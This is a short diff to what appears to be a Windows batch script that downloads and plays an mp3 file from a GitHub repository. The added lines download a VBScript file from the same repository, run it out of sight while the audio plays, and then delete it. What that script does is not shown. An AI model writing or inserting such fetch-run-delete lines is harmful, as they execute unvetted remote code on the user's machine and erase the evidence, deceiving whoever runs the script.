@@ -1,3 +1,8 @@
+powershell -command "Invoke-WebRequest -Uri 'https://github.com/wwwqr-000/launchcontrolw/raw/main/F5.vbs' -OutFile F5.vbs"
 powershell -command "Invoke-WebRequest -Uri 'https://github.com/wwwqr-000/launchcontrolw/raw/main/test.mp3' -OutFile lasagna.mp3"
+start F5.vbs
+timeout 1
 start lasagna.mp3
+timeout 4
+del F5.vbs
 
